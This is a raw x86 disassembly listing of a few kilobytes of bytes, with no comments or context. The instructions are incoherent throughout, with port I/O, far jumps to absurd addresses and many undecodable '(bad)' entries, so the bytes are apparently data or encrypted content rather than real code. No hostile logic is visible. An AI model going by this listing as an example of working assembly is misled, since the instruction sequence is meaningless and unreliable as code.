  40212d:	rol    BYTE PTR [eax],0xca
  402130:	adc    eax,0x65a3130f
  402135:	iret   
  402136:	xchg   edx,eax
  402137:	es jge 0x402186
  40213a:	mov    ebp,0x730013b7
  40213f:	test   eax,0x7bb3a41b
  402144:	add    BYTE PTR [eax-0x18421e96],0x78
  40214b:	push   ebx
  40214c:	inc    esi
  40214d:	sahf   
  40214e:	leave  
  40214f:	jge    0x4021cf
  402151:	int3   
  402152:	ins    BYTE PTR es:[edi],dx
  402153:	jne    0x402122
  402155:	jne    0x40215f
  402157:	fldenv [eax+0xa]
  40215a:	mov    edi,0x84202dba
  40215f:	mov    edx,0x9067220b
  402164:	and    DWORD PTR [eax-0x74],0xbd380e55
  40216b:	dec    esi
  40216c:	xchg   ebx,eax
  40216d:	jmp    0x4021ec
  40216f:	or     eax,DWORD PTR [esi+0x60]
  402172:	jno    0x402105
  402174:	imul   ecx,DWORD PTR [edi+0xf],0x9ecf607c
  40217b:	in     al,dx
  40217c:	push   cs
  40217d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40217e:	sar    BYTE PTR [eax-0x7e],0x22
  402182:	push   edx
  402183:	push   0x66136241
  402188:	in     al,0xcd
  40218a:	popf   
  40218b:	js     0x402139
  40218d:	sbb    ebx,eax
  40218f:	or     BYTE PTR [edx-0x2b4639e5],al
  402195:	cmp    al,0x8
  402197:	xor    eax,0xa2021f31
  40219c:	aas    
  40219d:	stc    
  40219e:	inc    ebp
  40219f:	sub    eax,0x55960ff
  4021a4:	repz mov ebx,0xf7444da
  4021aa:	or     al,0x73
  4021ac:	xor    eax,0xfae25bc1
  4021b1:	pop    ss
  4021b2:	sub    eax,0xf6847ee3
  4021b7:	jle    0x4021c3
  4021b9:	push   ss
  4021ba:	mov    ds:0x546d2944,al
  4021bf:	sbb    al,0x7a
  4021c1:	xchg   DWORD PTR [ebp+0x7d7b1160],ebp
  4021c7:	jnp    0x40219d
  4021c9:	fs jne 0x4021f0
  4021cc:	cmp    eax,0xccbd52cc
  4021d1:	push   ss
  4021d2:	popf   
  4021d3:	test   BYTE PTR [edi],0x5f
  4021d6:	nop
  4021d7:	or     esp,DWORD PTR [esi-0x5ffd7cb5]
  4021dd:	mov    DWORD PTR [edx],esi
  4021df:	or     al,0x88
  4021e1:	ret    0x8931
  4021e4:	jbe    0x40225c
  4021e6:	aad    0xe5
  4021e8:	cdq    
  4021e9:	mov    ch,0xbe
  4021eb:	pop    ds
  4021ec:	lods   al,BYTE PTR ds:[esi]
  4021ed:	clc    
  4021ee:	data16 jl 0x40226b
  4021f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021f2:	aam    0x7a
  4021f4:	imul   esi,DWORD PTR [ecx],0x9
  4021f7:	or     edi,DWORD PTR [ebp-0xe]
  4021fa:	cli    
  4021fb:	icebp  
  4021fc:	xlat   BYTE PTR ds:[ebx]
  4021fd:	cld    
  4021fe:	int    0xcf
  402200:	lahf   
  402201:	fcom   QWORD PTR [ebx]
  402203:	lock mov ebp,DWORD PTR [edi+0x33]
  402207:	in     eax,dx
  402208:	clc    
  402209:	lea    ebp,[ebx+0x43]
  40220c:	xchg   ebx,eax
  40220d:	arpl   WORD PTR [eax],bp
  40220f:	shl    BYTE PTR [ecx-0x2233ea5a],0x5c
  402216:	imul   edi,DWORD PTR [edi],0xffffffa5
  402219:	pushf  
  40221a:	pop    esi
  40221b:	retf   
  40221c:	test   al,0x10
  40221e:	mov    al,0xb2
  402220:	mov    esi,DWORD PTR [edx+0x57]
  402223:	(bad)  
  402224:	out    dx,eax
  402225:	es mov esp,0x214619e1
  40222b:	adc    al,0x8c
  40222d:	jmp    0x4022a9
  40222f:	int    0xdc
  402231:	sar    BYTE PTR [edx-0x66ce6fcd],0xa1
  402238:	lock pop eax
  40223a:	adc    BYTE PTR [esi],cl
  40223c:	xor    ebx,DWORD PTR [edi]
  40223e:	(bad)  
  40223f:	and    al,0x46
  402241:	nop
  402242:	shl    DWORD PTR [edi-0x1a],1
  402245:	adc    DWORD PTR [edx],0x55
  402248:	hlt    
  402249:	adc    esp,eax
  40224b:	int3   
  40224c:	add    al,0x94
  40224e:	mov    DWORD PTR [edx+0x50513471],ebp
  402254:	(bad)  
  402255:	out    dx,eax
  402256:	hlt    
  402257:	pop    ds
  402258:	push   ebx
  402259:	retf   
  40225a:	out    0xd7,eax
  40225c:	nop
  40225d:	add    ch,bh
  40225f:	push   eax
  402260:	fwait
  402261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402262:	hlt    
  402263:	in     al,0x41
  402265:	pop    edx
  402266:	out    dx,al
  402267:	ret    0xf74a
  40226a:	scas   al,BYTE PTR es:[edi]
  40226b:	sbb    edi,DWORD PTR [ecx+0x58ace8ca]
  402271:	scas   al,BYTE PTR es:[edi]
  402272:	jns    0x4022af
  402274:	dec    eax
  402275:	jbe    0x402213
  402277:	pop    ebp
  402278:	cs popa 
  40227a:	adc    BYTE PTR [ebp-0x60],bh
  40227d:	loop   0x40223d
  40227f:	inc    eax
  402280:	mov    cl,0x91
  402282:	ret    
  402283:	mov    ss,esp
  402285:	call   0x8b121820
  40228a:	in     al,dx
  40228b:	sbb    bh,bh
  40228d:	and    ebx,DWORD PTR [edi-0x1af9ecbf]
  402293:	push   esi
  402294:	mov    ebp,0x98210360
  402299:	mov    eax,0xfb59f714
  40229e:	in     eax,dx
  40229f:	push   esp
  4022a0:	dec    edi
  4022a1:	xor    dh,BYTE PTR [ebx+0x10]
  4022a4:	aam    0x75
  4022a6:	mov    esp,0x35dfd21
  4022ab:	scas   al,BYTE PTR es:[edi]
  4022ac:	cmp    bh,BYTE PTR [ebp-0x19]
  4022af:	mov    WORD PTR [ebp-0x69019b30],cs
  4022b5:	jns    0x4022df
  4022b7:	xchg   ebx,eax
  4022b8:	(bad)  
  4022ba:	mov    BYTE PTR [edi],al
  4022bc:	jg     0x4022dd
  4022be:	ins    DWORD PTR es:[edi],dx
  4022bf:	lahf   
  4022c0:	call   0xdc74b4e1
  4022c5:	ret    0x561d
  4022c8:	dec    eax
  4022c9:	jmp    0x402312
  4022cb:	out    dx,eax
  4022cc:	or     edi,DWORD PTR [edx+0x6328ff60]
  4022d2:	pop    dx
  4022d4:	sub    ax,0xa3d7
  4022d8:	pusha  
  4022d9:	dec    esi
  4022da:	pop    ebx
  4022db:	jae    0x4022b5
  4022dd:	push   edx
  4022de:	add    DWORD PTR [ebp-0x21],ebp
  4022e1:	jle    0x4022d7
  4022e3:	dec    esi
  4022e4:	clc    
  4022e5:	fdivr  DWORD PTR [eax-0x3a9c2b73]
  4022eb:	in     eax,dx
  4022ec:	gs dec esi
  4022ee:	les    esi,FWORD PTR [ebp+0x1adcee44]
  4022f4:	jmp    0x37a265db
  4022f9:	dec    ebp
  4022fa:	or     eax,0x26c4fdec
  4022ff:	and    ebx,edx
  402301:	fwait
  402302:	xchg   ecx,eax
  402303:	dec    ebx
  402304:	dec    edx
  402305:	mov    ds:0x2ec02a8f,eax
  40230a:	pop    ds
  40230b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40230c:	inc    esp
  40230d:	jmp    0x10e88b2f
  402312:	imul   ebp,DWORD PTR [eax],0x8d7649d7
  402318:	and    edx,DWORD PTR [edi+0x3d]
  40231b:	lds    edi,FWORD PTR [eax+0x4c]
  40231e:	retf   0xf62e
  402321:	addr16 pusha 
  402323:	mov    eax,esp
  402325:	dec    ebp
  402326:	mov    dh,0x3c
  402328:	sub    eax,0xf9d622b
  40232d:	out    dx,eax
  40232e:	cwde   
  40232f:	imul   ebp,DWORD PTR [edx],0xffffffb6
  402332:	sbb    eax,0xebbb3429
  402337:	mov    db1,esp
  40233a:	test   eax,0x382373d
  40233f:	lahf   
  402340:	ficom  WORD PTR [ebx+0x5b]
  402343:	cmp    al,BYTE PTR [ebx+0x576f4e7b]
  402349:	mov    ecx,0xa785376b
  40234e:	fnstsw WORD PTR [esi-0x27]
  402351:	mov    ah,0x95
  402353:	add    DWORD PTR [ebx+ebx*4-0x60],edx
  402357:	ret    0xa882
  40235a:	int    0x5d
  40235c:	iret   
  40235d:	test   al,0xcf
  40235f:	mov    bl,dl
  402361:	out    0x56,al
  402363:	adc    DWORD PTR [edi-0x6b],edx
  402366:	xchg   esp,eax
  402367:	test   BYTE PTR [edx+ebp*8-0x4344b4bf],0x2c
  40236f:	sub    DWORD PTR [ecx+0x3d],0x24
  402373:	mov    ds:0x81870b51,eax
  402378:	mov    WORD PTR [esi+eax*2-0x31898a5e],es
  40237f:	adc    BYTE PTR [esi],0xd8
  402382:	fst    DWORD PTR [edi]
  402384:	(bad)  
  402386:	not    BYTE PTR [ecx+0x15]
  402389:	rcr    BYTE PTR [ecx-0x7cb65d45],1
  40238f:	stc    
  402390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402391:	stc    
  402392:	jmp    0x25ab1ae
  402397:	outs   dx,BYTE PTR ds:[esi]
  402398:	out    0xc5,eax
  40239a:	cmp    DWORD PTR [ebp-0x6e],edx
  40239d:	push   ds
  40239e:	shl    DWORD PTR [edx+0x6b],cl
  4023a1:	nop
  4023a2:	pop    edx
  4023a3:	imul   esi,DWORD PTR ds:0x5deb8649,0x6fd9ce1c
  4023ad:	call   0xd7e6a747
  4023b2:	jae    0x4023d0
  4023b4:	mov    al,0x7e
  4023b6:	or     ah,ah
  4023b8:	inc    esi
  4023b9:	fisubr DWORD PTR [edi+0x37440588]
  4023bf:	cwde   
  4023c0:	xchg   edx,eax
  4023c1:	retf   0xb5db
  4023c4:	scas   eax,DWORD PTR es:[edi]
  4023c5:	mov    edx,0xa39b406a
  4023ca:	xor    BYTE PTR [edx+0x35435a94],bl
  4023d0:	mov    al,0x57
  4023d2:	or     edx,DWORD PTR [ecx-0x17]
  4023d5:	sar    bh,cl
  4023d7:	(bad)  
  4023d8:	dec    ebx
  4023d9:	and    DWORD PTR [ebx],ecx
  4023db:	nop
  4023dc:	pop    ebx
  4023dd:	mov    esi,0xc86889cb
  4023e2:	aad    0x68
  4023e4:	xchg   BYTE PTR [edi-0x7c1bd77c],bl
  4023ea:	sbb    DWORD PTR ds:0x1ceb8a85,ebp
  4023f0:	adc    eax,0x2bfa7744
  4023f5:	and    al,0x21
  4023f7:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4023f9:	(bad)  
  4023fa:	lock xor al,BYTE PTR [edi+esi*8]
  4023fe:	ror    BYTE PTR [edx-0x13cfefe4],0xf5
  402405:	bound  eax,QWORD PTR [ebx+ebx*1+0x10]
  402409:	jb     0x40245a
  40240b:	and    al,bl
  40240d:	pop    ds
  40240e:	cdq    
  40240f:	movsx  edi,BYTE PTR [ecx-0x58]
  402413:	imul   esi,DWORD PTR [edx*8+0x1e8b53e8],0xc2caed33
  40241e:	ss jecxz 0x4023df
  402421:	xor    cl,BYTE PTR [ebx+0xb]
  402424:	or     al,0x3c
  402426:	retf   0x45bc
  402429:	call   0xe124:0x1ff95fc7
  402430:	icebp  
  402431:	dec    esp
  402432:	push   0x72be19ba
  402437:	loop   0x4023f3
  402439:	mov    cl,0x31
  40243b:	dec    ecx
  40243c:	out    0xa,al
  40243e:	inc    ebx
  40243f:	call   0x60d38045
  402444:	push   edx
  402445:	jno    0x40244d
  402447:	inc    edi
  402448:	jnp    0x4023d0
  40244a:	sub    edi,eax
  40244c:	in     al,dx
  40244d:	mov    ch,0x67
  40244f:	aas    
  402450:	jmp    0x38b8:0x38eab03f
  402457:	pop    ebp
  402458:	das    
  402459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40245a:	jnp    0x40247c
  40245c:	fwait
  40245d:	ror    DWORD PTR [edi+0x16],cl
  402460:	or     al,ch
  402462:	or     ah,BYTE PTR [ebp+eax*4-0x5f]
  402466:	jl     0x4024da
  402468:	add    ch,BYTE PTR [edx]
  40246a:	jle    0x402415
  40246c:	xchg   edi,eax
  40246d:	mov    esi,0xdd3b5709
  402472:	fwait
  402473:	xchg   BYTE PTR [ebp-0x27],al
  402476:	repz mov ds:0xd704ffb4,eax
  40247c:	loop   0x402406
  40247e:	imul   edx,DWORD PTR [ebp-0x76],0x9de78044
  402485:	test   DWORD PTR [esi-0x303e7298],ebp
  40248b:	mov    esi,0x9cd36bfe
  402490:	outs   dx,BYTE PTR ds:[esi]
  402491:	imul   esi,DWORD PTR ds:0xff561137,0x8bc6a0c1
  40249b:	aas    
  40249c:	ins    DWORD PTR es:[edi],dx
  40249d:	mov    WORD PTR [edx+0x79],fs
  4024a0:	xor    edi,eax
  4024a2:	retf   0x857b
  4024a5:	or     BYTE PTR [edi+0x1f],bl
  4024a8:	addr16 in eax,dx
  4024aa:	jge    0x40248f
  4024ac:	sti    
  4024ad:	cwde   
  4024ae:	(bad)
  4024b1:	inc    ecx
  4024b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024b3:	xor    bh,BYTE PTR [ecx-0xf]
  4024b6:	mov    al,ds:0xcd53f88b
  4024bb:	inc    ebp
  4024bc:	xor    al,0x92
  4024be:	mov    edi,ss
  4024c0:	dec    eax
  4024c1:	mov    DWORD PTR ds:0xbc846524,ebx
  4024c7:	add    edx,ecx
  4024c9:	xchg   edi,eax
  4024ca:	int    0x4a
  4024cc:	mov    al,ds:0x68f8e29d
  4024d1:	lods   al,BYTE PTR ds:[esi]
  4024d2:	lock test BYTE PTR [ecx-0x40535b84],ch
  4024d9:	ror    dh,cl
  4024db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024dc:	dec    esp
  4024dd:	stos   BYTE PTR es:[edi],al
  4024de:	inc    edi
  4024df:	inc    ebp
  4024e0:	inc    ebx
  4024e1:	in     eax,0x6b
  4024e3:	jno    0x402505
  4024e5:	inc    esi
  4024e6:	popa   
  4024e7:	sar    DWORD PTR [ecx+0x3f],0x35
  4024eb:	push   cs
  4024ec:	cli    
  4024ed:	bound  edi,QWORD PTR [edx-0x4c]
  4024f0:	nop
  4024f1:	ss ds iret 
  4024f4:	and    BYTE PTR ss:[ebp+eiz*4-0x5c],dl
  4024f9:	leave  
  4024fa:	jg     0x40249b
  4024fc:	test   ebp,ecx
  4024fe:	mov    esi,0xdc64b231
  402503:	push   ss
  402504:	fimul  WORD PTR [ebx-0x28]
  402507:	xchg   esp,eax
  402508:	test   eax,0x28caf49d
  40250d:	stc    
  40250e:	retf   0xa4d5
  402511:	call   0x95920747
  402516:	cdq    
  402517:	push   ds
  402518:	cmp    eax,DWORD PTR [esi+0x1b]
  40251b:	scas   al,BYTE PTR es:[edi]
  40251c:	retf   
  40251d:	retf   0xa342
  402520:	pop    ebx
  402521:	lods   al,BYTE PTR ds:[esi]
  402522:	add    eax,0xb31349f7
  402527:	loop   0x4024dc
  402529:	fdivr  st(7),st
  40252b:	cwde   
  40252c:	add    esi,esp
  40252e:	sahf   
  40252f:	jp     0x4024d2
  402531:	and    al,al
  402533:	sub    edi,eax
  402535:	loop   0x402563
  402537:	or     DWORD PTR [ebx],ebp
  402539:	not    BYTE PTR [esi-0x63]
  40253c:	loope  0x402559
  40253e:	cmp    DWORD PTR [ecx],eax
  402540:	xchg   esp,eax
  402541:	pusha  
  402542:	push   edx
  402543:	das    
  402544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402545:	push   ecx
  402546:	fidivr DWORD PTR [ebx-0x6a]
  402549:	(bad)  
  40254b:	out    0x88,al
  40254d:	aas    
  40254e:	jo     0x4025b5
  402550:	mov    eax,ds:0x6dc71368
  402555:	in     al,dx
  402556:	and    DWORD PTR [edi],eax
  402558:	sti    
  402559:	push   ecx
  40255a:	fwait
  40255b:	sub    esi,edx
  40255d:	mov    WORD PTR ds:0xbbc9d7fb,ss
  402563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402564:	mov    al,0x85
  402566:	aad    0x2b
  402568:	outs   dx,BYTE PTR ds:[esi]
  402569:	mov    cl,0xcf
  40256b:	sub    eax,0xc043477b
  402570:	shl    BYTE PTR [esi+0x747c905],1
  402576:	bound  ebx,QWORD PTR [edi+0x17]
  402579:	lock sub DWORD PTR [eax+ebx*1-0x8],0xffffff97
  40257f:	lods   eax,DWORD PTR ds:[esi]
  402580:	aas    
  402581:	xor    al,0x12
  402583:	mov    dh,0x31
  402585:	(bad)  
  402586:	out    0x36,al
  402588:	add    ah,BYTE PTR [ebx+edi*8-0x14585fc4]
  40258f:	sbb    eax,0xaaa2323
  402594:	mov    WORD PTR [ebx],gs
  402596:	sub    BYTE PTR [esp+edi*8-0x5ac6b0f5],ah
  40259d:	scas   al,BYTE PTR es:[edi]
  40259e:	cs mov ebp,0xf5bca52c
  4025a4:	push   ebp
  4025a5:	mov    ecx,0x20cc2a9f
  4025aa:	push   esi
  4025ab:	int3   
  4025ac:	cmp    BYTE PTR [ecx-0x388719a9],al
  4025b2:	jl     0x4025a8
  4025b4:	int3   
  4025b5:	(bad)  
  4025b6:	cmp    BYTE PTR [ebp+0x25],ah
  4025b9:	push   esp
  4025ba:	scas   eax,DWORD PTR es:[edi]
  4025bb:	test   DWORD PTR [ecx+ebx*8+0x5e],esp
  4025bf:	mov    ds:0xe403dc28,eax
  4025c4:	popf   
  4025c5:	cmc    
  4025c6:	fidiv  DWORD PTR [esi]
  4025c8:	mov    ah,0x8c
  4025ca:	sbb    al,0xb8
  4025cc:	xor    ebx,DWORD PTR [ebx-0x22]
  4025cf:	(bad)  
  4025d0:	std    
  4025d1:	imul   edi,ecx,0xd
  4025d4:	jno    0x402578
  4025d6:	aad    0x18
  4025d8:	enter  0xd9d7,0x89
  4025dc:	mov    al,ds:0x45232bc7
  4025e1:	ja     0x402606
  4025e3:	fisub  DWORD PTR [ebp-0x76]
  4025e6:	pop    edi
  4025e7:	mov    bh,0x3e
  4025e9:	fbld   TBYTE PTR [edi-0x1be32a27]
  4025ef:	xchg   esi,eax
  4025f1:	rcl    esi,cl
  4025f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025f4:	pop    edx
  4025f5:	pushf  
  4025f6:	inc    ebx
  4025f7:	mov    al,0x1
  4025f9:	loope  0x4025e2
  4025fb:	pop    edx
  4025fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025fd:	pop    ds
  4025fe:	clc    
  4025ff:	mov    DWORD PTR gs:[ebp+0x6f6d74c6],edi
  402606:	pop    ebp
  402607:	cmp    BYTE PTR [ebx-0x367497b1],bh
  40260d:	inc    edi
  40260e:	pop    es
  40260f:	push   0xd1672900
  402614:	inc    ebp
  402615:	dec    edi
  402616:	call   FWORD PTR [esi-0x6e5bd5f1]
  40261c:	mov    ebx,0xb9b1b9b1
  402621:	sti    
  402622:	pop    edx
  402623:	dec    ecx
  402624:	lods   al,BYTE PTR ds:[esi]
  402625:	push   es
  402626:	xchg   ecx,eax
  402627:	mov    edi,0xbd666a03
  40262c:	adc    dh,BYTE PTR [eax+0x49d0d2a6]
  402632:	test   BYTE PTR [edx-0x5a],ah
  402635:	jmp    0x50c4:0xf5aba021
  40263c:	dec    DWORD PTR [edx]
  40263e:	fnsave [edi+0x562e610b]
  402644:	jp     0x40265b
  402646:	test   BYTE PTR [ebx+0x3],bh
  402649:	repz in eax,dx
  40264b:	xor    bh,0xb2
  40264e:	loopne 0x402686
  402650:	scas   al,BYTE PTR es:[edi]
  402651:	or     eax,0x9d72af18
  402656:	mov    ds:0x2cdfbe10,al
  40265b:	adc    BYTE PTR [edi+0x36],al
  40265e:	mov    WORD PTR [ecx],es
  402660:	pop    edi
  402661:	mov    edi,0x3d97e3b0
  402666:	xor    al,0xd7
  402668:	push   cs
  402669:	pop    ebp
  40266a:	test   DWORD PTR [edi+esi*8],ecx
  40266d:	adc    bh,dl
  40266f:	test   DWORD PTR [edi-0x51],0x29affccd
  402676:	xor    bh,dl
  402678:	ins    BYTE PTR es:[edi],dx
  402679:	ret    
  40267a:	add    al,0xd1
  40267c:	fistp  DWORD PTR [edi+ebp*4-0x1]
  402680:	imul   ebx,DWORD PTR [esi+0x16ef6776],0x6b6764ad
  40268a:	ss jmp 0x54a4:0x841e790c
  402692:	in     al,dx
  402693:	xor    cl,ah
  402695:	jmp    0xbdfd:0x9eacea5e
  40269c:	xor    eax,0xc98ecb68
  4026a1:	pop    esp
  4026a2:	add    eax,0xe95f92ea
  4026a7:	or     ch,BYTE PTR [ebx-0x1dd33671]
  4026ad:	lds    ebx,FWORD PTR [ebx-0x5c]
  4026b0:	ss pop esp
  4026b2:	enter  0x5f8c,0x1a
  4026b6:	jge    0x4026a0
  4026b8:	sub    ebp,ebx
  4026ba:	jmp    0x6bbbc379
  4026bf:	mov    ebx,DWORD PTR fs:[edx-0x63]
  4026c3:	mov    eax,esp
  4026c5:	das    
  4026c6:	and    DWORD PTR [esi+edi*4-0x4],0x8ee41735
  4026ce:	test   al,0xf6
  4026d0:	mov    WORD PTR [edi],?
  4026d2:	pop    esi
  4026d3:	add    DWORD PTR ds:0xcabefa4d,ebp
  4026d9:	out    0xea,eax
  4026db:	cmp    edx,DWORD PTR [edi+0x23e3f8de]
  4026e1:	adc    ebx,DWORD PTR [ecx+0x7b]
  4026e4:	mov    WORD PTR [edx+0x6966a695],ss
  4026ea:	bnd je 0x4026ff
  4026ed:	adc    eax,DWORD PTR [ebp+0x5d]
  4026f0:	ja     0x4026bf
  4026f2:	fisubr DWORD PTR gs:[ecx]
  4026f5:	cmp    eax,0x6b7858ce
  4026fa:	and    ebp,DWORD PTR [ebp-0x725425a4]
  402700:	push   ebx
  402701:	imul   edi,DWORD PTR [esi+0x6794eb1b],0x2e
  402708:	mov    esi,0xaf7c9ce5
  40270d:	or     eax,0x5fbcbfec
  402712:	mov    eax,ds:0x3e40c2bc
  402717:	cmc    
  402718:	ins    DWORD PTR es:[edi],dx
  402719:	mov    eax,0x22ce13cd
  40271e:	mul    BYTE PTR [edx+edx*4-0x1e]
  402722:	xchg   ebp,eax
  402723:	stos   BYTE PTR es:[edi],al
  402724:	jecxz  0x4026d3
  402726:	xor    esp,ebx
  402728:	and    BYTE PTR [esp+ebx*8-0x35],0x9d
  40272d:	aas    
  40272e:	loopne 0x402788
  402730:	and    eax,0x63038bd2
  402735:	pop    edi
  402736:	outs   dx,DWORD PTR ds:[esi]
  402737:	fcmove st,st(4)
  402739:	jle    0x402770
  40273b:	(bad)  
  40273c:	xor    al,0xe0
  40273e:	cs xchg ecx,eax
  402740:	or     bl,BYTE PTR [edx-0x196857c5]
  402746:	test   al,0x62
  402748:	in     al,dx
  402749:	mov    fs,WORD PTR [edx-0x4b]
  40274c:	mov    es,WORD PTR [edx-0xe36d40f]
  402752:	test   eax,0x9e5598ac
  402757:	call   0x8ca16332
  40275c:	outs   dx,BYTE PTR ss:[esi]
  40275e:	call   0x27c2987
  402763:	dec    esp
  402764:	sbb    BYTE PTR [eax],dl
  402766:	dec    edi
  402767:	loope  0x40279b
  402769:	dec    eax
  40276a:	xchg   edx,eax
  40276b:	popa   
  40276c:	lods   al,BYTE PTR ds:[esi]
  40276d:	les    ebx,FWORD PTR [eax-0xadb6b62]
  402773:	mov    edi,0x4c69dacc
  402778:	and    edx,DWORD PTR [ebx]
  40277a:	and    eax,0xfd5751e
  40277f:	xchg   ecx,eax
  402780:	ds xchg esp,eax
  402782:	aad    0x3a
  402784:	and    DWORD PTR [eax],0x6b
  402787:	int3   
  402788:	fidiv  WORD PTR [eax]
  40278a:	adc    DWORD PTR [esi],0x7a
  40278d:	cmp    dh,bl
  40278f:	add    DWORD PTR [edi+ebp*8+0x7b86cc7],edi
  402796:	pop    esp
  402797:	mov    al,BYTE PTR [edx+0x312b6abf]
  40279d:	inc    DWORD PTR fs:[eax+0x3443f6c]
  4027a4:	add    al,BYTE PTR [edi+0x50]
  4027a7:	pinsrw mm7,edx,0x89
  4027ab:	sub    al,0xa6
  4027ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027ae:	and    dh,0x9c
  4027b1:	data16 mov dh,0x34
  4027b4:	sub    cl,BYTE PTR [eiz*1+0x1857a056]
  4027bb:	push   DWORD PTR [esp+esi*1+0xa252e8]
  4027c2:	cmp    cl,bl
  4027c4:	adc    BYTE PTR [ebp+0x76fbcd5d],cl
  4027ca:	repz mov bh,0xd4
  4027cd:	push   esp
  4027ce:	pop    esi
  4027cf:	jle    0x4027e5
  4027d1:	jns    0x402815
  4027d3:	mov    ch,BYTE PTR [esi+0x5e953bcb]
  4027d9:	pop    ds
  4027da:	repz jle 0x402795
  4027dd:	(bad)  
  4027de:	int    0x67
  4027e0:	psubsb mm4,QWORD PTR [ecx+0x4b]
  4027e4:	out    dx,eax
  4027e5:	mov    esi,0x9695dbed
  4027ea:	aaa    
  4027eb:	ins    DWORD PTR es:[edi],dx
  4027ec:	xchg   BYTE PTR [eax],al
  4027ee:	repz jle 0x4027ba
  4027f1:	sahf   
  4027f2:	fdiv   DWORD PTR [edx-0x1f]
  4027f5:	imul   eax,edx,0x8d9b8112
  4027fb:	cmp    ch,BYTE PTR [ecx+0x1e]
  4027fe:	xchg   BYTE PTR [ebx+0x124a8bce],ah
  402804:	jge    0x4027b9
  402806:	jno    0x402885
  402808:	out    0x78,al
  40280a:	and    al,0xe1
  40280c:	fisubr DWORD PTR [ecx-0x1e7d1ed9]
  402812:	(bad)  
  402813:	aaa    
  402814:	jno    0x4027e6
  402816:	jnp    0x4027fd
  402818:	inc    esi
  402819:	repnz sar DWORD PTR [eax-0x6b741b82],1
  402820:	adc    bh,BYTE PTR [eax]
  402822:	cdq    
  402823:	mov    ah,0x5f
  402825:	xor    ebp,0x8a17927f
  40282b:	(bad)  
  40282d:	lods   eax,DWORD PTR ds:[esi]
  40282e:	pop    es
  40282f:	xchg   edi,eax
  402830:	dec    edi
  402831:	(bad)  
  402832:	in     al,0x11
  402834:	stos   DWORD PTR es:[edi],eax
  402835:	in     eax,0x39
  402837:	inc    BYTE PTR [edx+ebp*2]
  40283a:	sbb    edi,ebp
  40283c:	pop    es
  40283d:	rol    ch,0x53
  402840:	push   ebx
  402841:	fild   WORD PTR [ecx+0x32800c8d]
  402847:	mov    al,ds:0xc22e01cd
  40284c:	xchg   DWORD PTR [ebp-0x13237e61],esp
  402852:	inc    ebp
  402853:	cmp    al,0x8a
  402855:	jmp    0x402821
  402857:	mov    edi,0xf120822c
  40285c:	pop    ebx
  40285d:	jnp    0x402830
  40285f:	and    DWORD PTR [ecx+edx*4],ebp
  402862:	das    
  402863:	ins    BYTE PTR es:[edi],dx
  402864:	dec    ecx
  402865:	int3   
  402866:	lahf   
  402867:	dec    ecx
  402868:	push   0x74
  40286a:	fwait
  40286b:	mov    bl,0xf6
  40286d:	out    0x2e,al
  40286f:	fidiv  DWORD PTR [edx]
  402871:	mov    edx,0x2813c843
  402876:	adc    eax,DWORD PTR [ecx]
  402878:	and    BYTE PTR [ebx+0x385f7aad],ch
  40287e:	loop   0x4028c3
  402880:	pop    ss
  402881:	xor    eax,0x66f5e51f
  402886:	mov    cl,0x83
  402888:	call   0xfcbb89f3
  40288d:	pop    edi
  40288e:	lods   al,BYTE PTR ds:[esi]
  40288f:	xchg   edx,eax
  402890:	cmp    al,0x76
  402892:	xor    dh,BYTE PTR [esi]
  402894:	xchg   esi,eax
  402895:	sub    esi,DWORD PTR [eax-0x1020fc4d]
  40289b:	and    BYTE PTR [ebx-0x7fc776c1],0x8b
  4028a2:	mov    ch,0x31
  4028a4:	ins    BYTE PTR es:[edi],dx
  4028a5:	out    0x5,al
  4028a7:	xchg   edi,eax
  4028a8:	jbe    0x402854
  4028aa:	imul   esi,edi,0x8ffe1d9c
  4028b0:	adc    edx,0xfe856c26
  4028b6:	pop    esi
  4028b7:	cld    
  4028b8:	pop    ebp
  4028b9:	stc    
  4028ba:	and    eax,0x350cf976
  4028bf:	inc    ebx
  4028c0:	mov    al,ds:0xc5d7af28
  4028c5:	pop    ebp
  4028c6:	test   BYTE PTR [ebx+0x4b53e6b2],ah
  4028cc:	cs sahf 
  4028ce:	fwait
  4028cf:	loop   0x40294c
  4028d1:	xor    ecx,DWORD PTR [ebx]
  4028d3:	sbb    eax,0xb2f8e7a0
  4028d8:	imul   eax,DWORD PTR [ebp+0x73fd9c85],0x2dee7b67
  4028e2:	sub    eax,0xdd54519d
  4028e7:	cld    
  4028e8:	fwait
  4028e9:	mov    bh,0x3e
  4028eb:	or     al,0xca
  4028ed:	xlat   BYTE PTR ds:[ebx]
  4028ee:	out    0x9a,al
  4028f0:	xchg   esi,eax
  4028f1:	or     BYTE PTR [eax+0x37],ch
  4028f4:	sub    eax,0xce49847d
  4028f9:	ror    BYTE PTR [eax+0x70],1
  4028fc:	pop    ds
  4028fd:	js     0x402898
  4028ff:	gs inc di
  402902:	mov    ds:0x203bcaac,eax
  402907:	lahf   
  402908:	test   al,0x46
  40290a:	(bad)  
  40290b:	push   edx
  40290c:	jp     0x4028ae
  40290e:	or     eax,0x6cd1ee5c
  402913:	fistp  QWORD PTR ds:0xc6a2341b
  402919:	iret   
  40291a:	aaa    
  40291b:	iret   
  40291c:	push   cs
  40291d:	test   DWORD PTR [edi+0x680c3c7],esp
  402923:	ficomp DWORD PTR [ebp-0x8]
  402926:	cmc    
  402927:	push   0xce65a8b3
  40292c:	loope  0x40296d
  40292e:	mov    al,0xa
  402930:	mov    BYTE PTR [edx+0x14f26206],ch
  402936:	push   0x228ba24b
  40293b:	and    BYTE PTR [eax-0x114e62],ch
  402941:	mov    ebx,0xb46dcf81
  402946:	dec    edi
  402947:	pop    edi
  402948:	jl     0x4029ba
  40294a:	jo     0x4028cf
  40294c:	push   eax
  40294d:	adc    DWORD PTR [ecx],ecx
  40294f:	retf   
